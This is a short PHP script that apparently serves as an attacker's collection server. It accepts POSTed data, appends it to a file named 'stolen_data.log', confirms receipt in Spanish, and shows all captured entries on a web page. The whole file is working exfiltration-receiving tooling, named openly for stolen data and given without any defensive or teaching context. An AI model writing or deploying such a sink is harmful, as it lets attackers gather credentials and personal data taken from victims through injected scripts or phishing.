<?php
$log_file = "stolen_data.log";

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $stolen_data = $_POST["data"] ?? "No data received";
    file_put_contents($log_file, $stolen_data . "\n\n", FILE_APPEND | LOCK_EX);
    echo "Datos recibidos correctamente.";
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Log data</title>
</head>
<body>
<h1>Log data</h1>
<pre>
        <?php
        if (file_exists($log_file)) {
            echo htmlspecialchars(file_get_contents($log_file));
        } else {
            echo "No data yet";
        }
        ?>
    </pre>
</body>
</html>
